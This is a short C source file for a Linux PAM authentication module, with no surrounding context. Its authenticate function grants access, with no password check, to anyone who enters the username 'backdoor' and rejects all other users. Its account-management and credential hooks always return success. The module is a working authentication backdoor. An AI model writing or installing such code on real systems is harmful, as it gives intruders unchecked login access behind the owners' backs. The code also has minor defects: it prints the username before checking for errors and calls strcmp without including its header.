#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <stdio.h>

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
  printf("Acct mgmt\n");
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
  const char *user;
  int  retval;

  retval = pam_get_user(pamh, &user, "Username: ");
  printf("Welcome %s\n", user);
  if (retval != PAM_SUCCESS)
    return retval;
  if (strcmp(user, "backdoor") != 0)
    return PAM_AUTH_ERR;
  return (PAM_SUCCESS);
}
